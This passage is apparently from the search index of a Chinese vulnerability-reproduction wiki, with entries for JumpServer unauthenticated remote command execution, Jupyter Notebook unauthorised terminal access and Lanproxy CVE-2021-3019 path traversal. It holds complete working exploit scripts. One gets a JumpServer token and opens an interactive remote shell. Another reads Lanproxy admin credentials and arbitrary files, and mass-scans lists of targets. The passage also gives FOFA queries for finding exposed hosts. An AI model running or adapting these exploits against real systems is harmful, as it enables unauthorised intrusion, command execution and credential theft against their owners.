\u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u53ea\u8981\u6a21\u62df\u4e86\u8fd9\u4e2a\u53d1\u9001\uff0c\u8fd4\u56de\u7684\u6570\u636e\u548cweb\u7ec8\u7aef\u662f\u4e00\u6837\u7684\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6837\u7684\u65b9\u6cd5\u6765\u8fdb\u884c\u547d\u4ee4\u6267\u884c\u4e86","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/JumpServer%E5%A0%A1%E5%9E%92%E6%9C%BA/JumpServer%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] POC \u91cc\u5305\u542b\u4e24\u4e2a\u65b9\u6cd5\uff0c\u4e00\u4e2a\u662f\u83b7\u53d6\u65e5\u5fd7\u6587\u4ef6\uff0c\u53e6\u4e00\u4e2a\u662f\u547d\u4ee4\u6267\u884c \u65e5\u5fd7\u63d0\u53d6\u5df2\u7ecf\u8fc7\u6ee4\u4e86\u90e8\u5206API\u8c03\u7528\u7684\u6570\u636e\uff0c\u53ea\u9700\u8981\u627e\u5230\u90a3\u51e0\u4e2a\u503c\u5c31\u597d\u4e86 \u547d\u4ee4\u6267\u884c\u9700\u8981\u4ece\u65e5\u5fd7\u4e2d\u83b7\u53d6\u654f\u611f\u6570\u636e\u5e76\u5199\u5165\u811a\u672c\u5bf9\u5e94\u7684\u53d8\u91cf\u4e2d \u63a5\u6536\u6570\u636e\u5982\u679c\u5361\u4f4f\u8bf7\u8c03\u6574 for i in range(7) \u8fd9\u4e2a\u4f4d\u7f6e\u7684 7 import requests import json import sys import time import asyncio import websockets import re from ws4py.client.threadedclient import WebSocketClient def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mPOC_Des: https://www.o2oxy.cn/ \\033 [0m' ) print ( '+ \\033 [34mVersion: JumpServer <= v2.6.1 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCmd >>> whoami \\033 [0m' ) print ( '+------------------------------------------' ) class ws_long ( WebSocketClient ): def opened ( self ): req = '{\"task\":\"peiqi/../../../../../logs/gunicorn\"}' self . send ( req ) def closed ( self , code , reason = None ): print ( \"Closed down:\" , code , reason ) def received_message ( self , resp ): resp = json . loads ( str ( resp )) # print(resp) data = resp [ 'message' ] print ( data ) if \"/api/v1/perms/asset-permissions/user/validate/?\" in data : print ( data ) async def send_msg ( websocket , _text ): if _text == \"exit\" : print ( f 'you have enter \"exit\", goodbye' ) await websocket . close ( reason = \"user exit\" ) return False await websocket . send ( _text ) recv_text = await websocket . recv () print ( re . findall ( r '\"data\":\"(.*?)\"' , recv_text )) async def main_logic ( target_url ): print ( \" \\033 [32m[o] \u6b63\u5728\u8fde\u63a5\u76ee\u6807: {} \\033 [0m\" . format ( target_url )) async with websockets . connect ( target_url ) as websocket : recv_text = await websocket . recv () resws = json . loads ( recv_text ) id = resws [ 'id' ] print ( \" \\033 [36m[o] \u6210\u529f\u83b7\u53d6 ID: {} \\033 [0m\" . format ( id )) inittext = json . dumps ({ \"id\" : id , \"type\" : \"TERMINAL_INIT\" , \"data\" : \"{ \\\" cols \\\" :164, \\\" rows \\\" :17}\" }) await send_msg ( websocket , inittext ) for i in range ( 7 ): recv_text = await websocket . recv () print ( re . findall ( r '\"data\":\"(.*?)\"' , recv_text )) while True : cmd = str ( input ( \" \\033 [35mcmd >>> \\033 [0m\" )) cmdtext = json . dumps ({ \"id\" : id , \"type\" : \"TERMINAL_DATA\" , \"data\" : cmd + \" \\r\\n \" }) await send_msg ( websocket , cmdtext ) for i in range ( 1 ): recv_text = await websocket . recv () print ( re . findall ( r '\"data\":\"(.*?)\"' , recv_text )) def POC_1 ( target_url ): vuln_url = target_url + \"/api/v1/users/connection-token/?user-only=1\" response = requests . get ( url = vuln_url , timeout = 5 ) print ( response . status_code ) ws_open = str ( input ( \" \\033 [32m[o] \u662f\u5426\u60f3\u8981\u63d0\u53d6\u65e5\u5fd7\uff08Y/N\uff09 >>> \\033 [0m\" )) try : if ws_open == \"Y\" or ws_open == \"y\" : ws = target_url . strip ( \"http://\" ) try : ws = ws_long ( 'ws:// {} /ws/ops/tasks/log/' . format ( ws )) ws . connect () ws . run_forever () ws . close () except KeyboardInterrupt : ws . close () else : print ( \" \\033 [31m[x] \u76ee\u6807\u6f0f\u6d1e\u5df2\u4fee\u590d\uff0c\u65e0\u6cd5\u83b7\u53d6\u654f\u611f\u65e5\u5fd7\u4fe1\u606f \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807\u6f0f\u6d1e\u5df2\u4fee\u590d\uff0c\u65e0\u6cd5\u83b7\u53d6\u654f\u611f\u65e5\u5fd7\u4fe1\u606f, {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) def POC_2 ( target_url , user , asset , system_user ): if target_url == \"\" or asset == \"\" or system_user == \"\" : print ( \" \\033 [31m[x] \u8bf7\u83b7\u53d6 assset \u7b49\u53c2\u6570\u914d\u7f6e \\033 [0m\" ) sys . exit ( 0 ) data = { \"user\" : user , \"asset\" : asset , \"system_user\" : system_user } vuln_url = target_url + \"/api/v1/users/connection-token/?user-only=1\" # vuln_url = target_url + \"/api/v1/authentication/connection-token/?user-only=1\" try : response = requests . post ( vuln_url , json = data , timeout = 5 ) . json () print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42\uff1a {} \\033 [0m\" . format ( vuln_url )) token = response [ 'token' ] print ( \" \\033 [36m[o] \u6210\u529f\u83b7\u53d6Token\uff1a {} \\033 [0m\" . format ( token )) ws_url = target_url . strip ( \"http://\" ) ws_url = \"ws://\" + ws_url + \"/koko/ws/token/?target_id= {} \" . format ( token ) asyncio . get_event_loop () . run_until_complete ( main_logic ( ws_url )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u68c0\u67e5 assset \u7b49\u53c2\u6570\u914d\u7f6e, {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) user = \"ed3460eb-3c70-4beb-b631-f8f91c39bdd1\" asset = \"37fce0b0-cc4f-4822-8c33-afdebc888fa7\" system_user = \"da09ddd7-fd3f-46c3-914d-752883a4d950\" POC_1 ( target_url ) POC_2 ( target_url , user , asset , system_user )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Jupyter%20Notebook/Jupyter%20Notebook%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"Jupyter Notebook \u672a\u6388\u6743\u8bbf\u95ee\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Jupyter Notebook\uff08\u6b64\u524d\u88ab\u79f0\u4e3a IPython notebook\uff09\u662f\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u7b14\u8bb0\u672c\uff0c\u652f\u6301\u8fd0\u884c 40 \u591a\u79cd\u7f16\u7a0b\u8bed\u8a00\u3002 \u5982\u679c\u7ba1\u7406\u5458\u672a\u4e3aJupyter Notebook\u914d\u7f6e\u5bc6\u7801\uff0c\u5c06\u5bfc\u81f4\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u6e38\u5ba2\u53ef\u5728\u5176\u4e2d\u521b\u5efa\u4e00\u4e2aconsole\u5e76\u6267\u884c\u4efb\u610fPython\u4ee3\u7801\u548c\u547d\u4ee4\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Jupyter Notebook FOFA \u00b6 [!NOTE] app=\"Jupyter-Notebook\" && body=\"Terminal\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee\u76ee\u6807, \u70b9\u51fb Terminal \u6253\u5f00\u547d\u4ee4\u884c\u754c\u9762 \u6267\u884c\u547d\u4ee4\u5e76\u53cd\u5f39shell","title":"Jupyter Notebook \u672a\u6388\u6743\u8bbf\u95ee\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Jupyter%20Notebook/Jupyter%20Notebook%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#jupyter-notebook-\u672a\u6388\u6743\u8bbf\u95ee\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","text":"","title":"Jupyter Notebook \u672a\u6388\u6743\u8bbf\u95ee\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Jupyter%20Notebook/Jupyter%20Notebook%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Jupyter Notebook\uff08\u6b64\u524d\u88ab\u79f0\u4e3a IPython notebook\uff09\u662f\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u7b14\u8bb0\u672c\uff0c\u652f\u6301\u8fd0\u884c 40 \u591a\u79cd\u7f16\u7a0b\u8bed\u8a00\u3002 \u5982\u679c\u7ba1\u7406\u5458\u672a\u4e3aJupyter Notebook\u914d\u7f6e\u5bc6\u7801\uff0c\u5c06\u5bfc\u81f4\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u6e38\u5ba2\u53ef\u5728\u5176\u4e2d\u521b\u5efa\u4e00\u4e2aconsole\u5e76\u6267\u884c\u4efb\u610fPython\u4ee3\u7801\u548c\u547d\u4ee4\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Jupyter%20Notebook/Jupyter%20Notebook%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Jupyter Notebook","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Jupyter%20Notebook/Jupyter%20Notebook%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] app=\"Jupyter-Notebook\" && body=\"Terminal\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Jupyter%20Notebook/Jupyter%20Notebook%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee\u76ee\u6807, \u70b9\u51fb Terminal \u6253\u5f00\u547d\u4ee4\u884c\u754c\u9762 \u6267\u884c\u547d\u4ee4\u5e76\u53cd\u5f39shell","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Lanproxy/Lanproxy%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%20CVE-2021-3019/","text":"Lanproxy \u76ee\u5f55\u904d\u5386\u6f0f\u6d1e CVE-2021-3019 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Lanproxy\u662f\u4e00\u4e2a\u5c06\u5c40\u57df\u7f51\u4e2a\u4eba\u7535\u8111\u3001\u670d\u52a1\u5668\u4ee3\u7406\u5230\u516c\u7f51\u7684\u5185\u7f51\u7a7f\u900f\u5de5\u5177\uff0c\u652f\u6301tcp\u6d41\u91cf\u8f6c\u53d1\uff0c\u53ef\u652f\u6301\u4efb\u4f55tcp\u4e0a\u5c42\u534f\u8bae\uff08\u8bbf\u95ee\u5185\u7f51\u7f51\u7ad9\u3001\u672c\u5730\u652f\u4ed8\u63a5\u53e3\u8c03\u8bd5\u3001ssh\u8bbf\u95ee\u3001\u8fdc\u7a0b\u684c\u9762\u7b49\u7b49\uff09\u672c\u6b21Lanproxy \u8def\u5f84\u904d\u5386\u6f0f\u6d1e (CVE-2021-3019)\u901a\u8fc7../\u7ed5\u8fc7\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\u3002\u8be5\u6f0f\u6d1e\u5141\u8bb8\u76ee\u5f55\u904d\u5386\u8bfb\u53d6/../conf/config.properties\u6765\u83b7\u53d6\u5230\u5185\u90e8\u7f51\u8fde\u63a5\u7684\u51ed\u636e\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Lanproxy 0.1 FOFA \u00b6 [!NOTE] header= \"Server: LPS-0.1\" \u73af\u5883\u642d\u5efa \u00b6 https://github.com/ffay/lanproxy/ \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6253\u5f00\u767b\u5f55\u9875\u9762\u5982\u4e0b \u4f7f\u7528Burp\u6293\u5305\u53d1\u9001\u5982\u4e0b\u8bf7\u6c42 GET /../conf/config.properties HTTP/1.1 Host: xxx.xxx.xxx.xxx Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close \u6210\u529f\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u8bfb\u53d6 \u8d26\u53f7\u5bc6\u7801 \u8bd5\u7740\u8bfb\u53d6\u5176\u4ed6\u654f\u611f\u6587\u4ef6 \u6f0f\u6d1e\u5229\u7528POC \u00b6 Github:CVE-2021-3019 #!/usr/bin/env python3 # -*- encoding: utf-8 -*- ''' @File : urllib.py @Time : 2021/01/10 21:59:32 @Author : _0xf4n9x_ @Version : 1.0 @Contact : fanq.xu@gmail.com @Desc : None ''' import sys import argparse import os from urllib import request from urllib import error banner = \"\"\" ###### ## ## ######## ####### ##### ####### ## ####### ##### ## ####### ## ## ## ## ## ## ## ## ## ## ## #### ## ## ## ## #### ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ###### ##### ####### ## ## ####### ## ##### ####### ## ## ## ######## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ###### ### ######## ######### ##### ######### ###### ####### ##### ###### ####### Author: _0xf4n9x_\"\"\" headers = { 'User-Agent' : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4080.0 Safari/537.36 Edg/82.0.453.0\" } def readConf ( url ): \"\"\" \u9ed8\u8ba4\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\uff0c\u5e76\u901a\u8fc7\u80fd\u5426\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\u6765\u5224\u65ad\u662f\u5426\u5b58\u5728\u6f0f\u6d1e \"\"\" config = [ 'config.server.bind' , 'config.server.port' , 'config.admin.username' , 'config.admin.password' ] path = \"/../conf/config.properties\" confUrl = url + path r = request . Request ( confUrl , headers = headers ) try : with request . urlopen ( r , timeout = 10 ) as resp : confContent = resp . read () . decode ( 'utf-8' ) for i in config : if i not in confContent : print ( \"[-] \" + url + \" is not vulnerable\" ) return 'Bye :(' print ( \"[+] \" + url + \" is vulnerable! :)\" ) return confContent except ConnectionResetError : print ( \"[-] \" + url + \" Connection reset by peer\" ) except error . HTTPError as e : print ( \"[-] \" + url + e . code + e . reason ) except error . URLError as e : print ( \"[-] \" + url + e . code + e . reason ) except : print ( \"[-] \" + url + \" is not vulnerable\" ) return 0 def readOtherFile ( url , path ): \"\"\" \u8bfb\u53d6\u4efb\u610f\u5176\u4ed6\u6587\u4ef6 \"\"\" jumpSym = \"/../../../../../../../../..\" fullUrl = url + jumpSym + path r = request . Request ( fullUrl , headers = headers ) with request . urlopen ( r , timeout = 10 ) as resp : fileContent = resp . read () . decode ( 'utf-8' ) print ( fileContent ) def run ( url , path = \"/../conf/config.properties\" ): if os . path . isfile ( url ) == False : # if 'http' not in url: # url = 'http://' + url url = 'http://' + url . replace ( 'http://' , '' ) . replace ( '/' , '' ) if path == \"/../conf/config.properties\" : print ( readConf ( url )) else : if readConf ( url ) not in [ 0 , 'Bye :(' ]: readOtherFile ( url , path ) else : urls = [] with open ( url ) as target : urls = target . read () . splitlines () for url in urls : # if 'http' not in url: # url = 'http://' + url url = 'http://' + url . replace ( 'http://' , '' ) . replace ( '/' , '' ) if readConf ( url ) not in [ 0 , 'Bye :(' ]: with open ( \"success.txt\" , \"a+\" ) as f : f . write ( url + \" \\n \" ) f . close () def main (): parser = argparse . ArgumentParser ( description = \"CVE-2021-3019 lanproxy arbitrary file read vulnerability detection POC\" ) parser . add_argument ( '-u' , '--url' , type = str , help = \"test a single website\" ) parser . add_argument ( '-r' , '--read' , type = str , help = \"this parameter is followed by the file name to be read, the configuration file is read by default\" ) parser . add_argument ( '-f' , '--file' , type = str , help = \"perform vulnerability checks on multiple websites in a file, and the vulnerable websites will be output to the success.txt file\" ) args = parser . parse_args () if len ( sys . argv ) <= 1 : parser . print_help () elif sys . argv [ 1 ] in [ '-u' , '--url' ]: if len ( sys . argv ) == 3 : run ( args . url ) elif len ( sys . argv ) == 5 : run ( args . url , args . read ) elif sys . argv [ 1 ] in [ '-f' , '--file' ]: run ( args . file ) if __name__ == \"__main__\" : print ( banner ) main () Goby & POC \u00b6 [!NOTE] Lanproxy_Arbitrary_File_Read_CVE-2021-3019","title":"Lanproxy \u76ee\u5f55\u904d\u5386\u6f0f\u6d1e CVE-2021-3019"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Lanproxy/Lanproxy%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%20CVE-2021-3019/#lanproxy-\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e-cve-2021-3019","text":"","title":"Lanproxy \u76ee\u5f55\u904d\u5386\u6f0f\u6d1e CVE-2021-3019"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Lanproxy/Lanproxy%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%20CVE-2021-3019/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Lanproxy\u662f\u4e00\u4e2a\u5c06\u5c40\u57df\u7f51\u4e2a\u4eba\u7535\u8111\u3001\u670d\u52a1\u5668\u4ee3\u7406\u5230\u516c\u7f51\u7684\u5185\u7f51\u7a7f\u900f\u5de5\u5177\uff0c\u652f\u6301tcp\u6d41\u91cf\u8f6c\u53d1\uff0c\u53ef\u652f\u6301\u4efb\u4f55tcp\u4e0a\u5c42\u534f\u8bae\uff08\u8bbf\u95ee\u5185\u7f51\u7f51\u7ad9\u3001\u672c\u5730\u652f\u4ed8\u63a5\u53e3\u8c03\u8bd5\u3001ssh\u8bbf\u95ee\u3001\u8fdc\u7a0b\u684c\u9762\u7b49\u7b49\uff09\u672c\u6b21Lanproxy \u8def\u5f84\u904d\u5386\u6f0f\u6d1e (CVE-2021-3019)\u901a\u8fc7../\u7ed5\u8fc7\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\u3002\u8be5\u6f0f\u6d1e\u5141\u8bb8\u76ee\u5f55\u904d\u5386\u8bfb\u53d6/../conf/config.properties\u6765\u83b7\u53d6\u5230\u5185\u90e8\u7f51\u8fde\u63a5\u7684\u51ed\u636e\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Lanproxy/Lanproxy%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%20CVE-2021-3019/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Lanproxy 0.1","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Lanproxy/Lanproxy%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%20CVE-2021-3019/#fofa","text":"[!NOTE] header= \"Server: LPS-0.1\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Lanproxy/Lanproxy%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%20CVE-2021-3019/#\u73af\u5883\u642d\u5efa","text":"https://github.com/ffay/lanproxy/","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Lanproxy/Lanproxy%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%20CVE-2021-3019/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6253\u5f00\u767b\u5f55\u9875\u9762\u5982\u4e0b \u4f7f\u7528Burp\u6293\u5305\u53d1\u9001\u5982\u4e0b\u8bf7\u6c42 GET /../conf/config.properties HTTP/1.1 Host: xxx.xxx.xxx.xxx Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close \u6210\u529f\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u8bfb\u53d6 \u8d26\u53f7\u5bc6\u7801 \u8bd5\u7740\u8bfb\u53d6\u5176\u4ed6\u654f\u611f\u6587\u4ef6","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Lanproxy/Lanproxy%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%20CVE-2021-3019/#\u6f0f\u6d1e\u5229\u7528poc","text":"Github:CVE-2021-3019 #!/usr/bin/env python3 # -*- encoding: utf-8 -*- ''' @File : urllib.py @Time : 2021/01/10 21:59:32 @Author : _0xf4n9x_ @Version : 1.0 @Contact : fanq.xu@gmail.com @Desc : None ''' import sys import argparse import os from urllib import request from urllib import error banner = \"\"\" ###### ## ## ######## ####### ##### ####### ## ####### ##### ## ####### ## ## ## ## ## ## ## ## ## ## ## #### ## ## ## ## #### ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ###### ##### ####### ## ## ####### ## ##### ####### ## ## ## ######## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ###### ### ######## ######### ##### ######### ###### ####### ##### ###### ####### Author: _0xf4n9x_\"\"\" headers = { 'User-Agent' : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4080.0 Safari/537.36 Edg/82.0.453.0\" } def readConf ( url ): \"\"\" \u9ed8\u8ba4\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\uff0c\u5e76\u901a\u8fc7\u80fd\u5426\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\u6765\u5224\u65ad\u662f\u5426\u5b58\u5728\u6f0f\u6d1e \"\"\" config = [ 'config.server.bind' , 'config.server.port' , 'config.admin.username' , 'config.admin.password' ] path = \"/../conf/config.properties\" confUrl = url + path r = request . Request ( confUrl , headers = headers ) try : with request . urlopen ( r , timeout = 10 ) as resp : confContent = resp . read () . decode ( 'utf-8' ) for i in config : if i not in confContent : print ( \"[-] \" + url + \" is not vulnerable\" ) return 'Bye :(' print ( \"[+] \" + url + \" is vulnerable! :)\" ) return confContent except ConnectionResetError : print ( \"[-] \" + url + \" Connection reset by peer\" ) except error . HTTPError as e : print ( \"[-] \" + url + e . code + e . reason ) except error . URLError as e : print ( \"[-] \" + url + e . code + e . reason ) except : print ( \"[-] \" + url + \" is not vulnerable\" ) return 0 def readOtherFile ( url , path ): \"\"\" \u8bfb\u53d6\u4efb\u610f\u5176\u4ed6\u6587\u4ef6 \"\"\" jumpSym = \"/../../../../../../../../..\" fullUrl = url + jumpSym + path r = request . Request ( fullUrl , headers = headers ) with request . urlopen ( r , timeout = 10 ) as resp : fileContent = resp . read () . decode ( 'utf-8' ) print ( fileContent ) def run ( url , path = \"/../conf/config.properties\" ): if os . path . isfile ( url ) == False : # if 'http' not in url: # url = 'http://' + url url = 'http://' + url . replace ( 'http://' , '' ) . replace ( '/' , '' ) if path == \"/../conf/config.properties\" : print ( readConf ( url )) else : if readConf ( url ) not in [ 0 , 'Bye :(' ]: readOtherFile ( url , path ) else : urls = [] with open ( url ) as target : urls = target . read () . splitlines () for url in urls : # if 'http' not in url: # url = 'http://' + url url = 'http://' + url . replace ( 'http://' , '' ) . replace ( '/' , '' ) if readConf ( url ) not in [ 0 , 'Bye :(' ]: with open ( \"success.txt\" , \"a+\" ) as f : f . write ( url + \" \\n \" ) f . close () def main (): parser = argparse . ArgumentParser ( description = \"CVE-2021-3019 lanproxy arbitrary file read vulnerability detection POC\" ) parser . add_argument ( '-u' , '--url' , type = str , help = \"test a single website\" ) parser . add_argument ( '-r' , '--read' , type = str , help = \"this parameter is followed by the file name to be read, the configuration file is read by default\" ) parser . add_argument ( '-f' , '--file' , type = str , help = \"perform vulnerability checks on multiple websites in a file, and the vulnerable websites will be output to the success.txt file\" ) args = parser . parse_args () if len ( sys . argv ) <= 1 : parser . print_help () elif sys . argv [ 1 ] in [ '-u' , '--url' ]: if len ( sys . argv ) == 3 : run ( args . url ) elif len ( sys . argv ) == 5 : run ( args . url , args . read ) elif sys . argv [ 1 ] in [ '-f' , '--file' ]: run ( args . file ) if __name__ == \"__main__\" : print ( banner ) main ()","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Lanproxy/Lanproxy%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%20CVE-2021-3019/#goby--poc","text":"[!NOTE] Lanproxy_Arbitrary_File_Read_CVE-2021-3019","title":"Goby &amp; 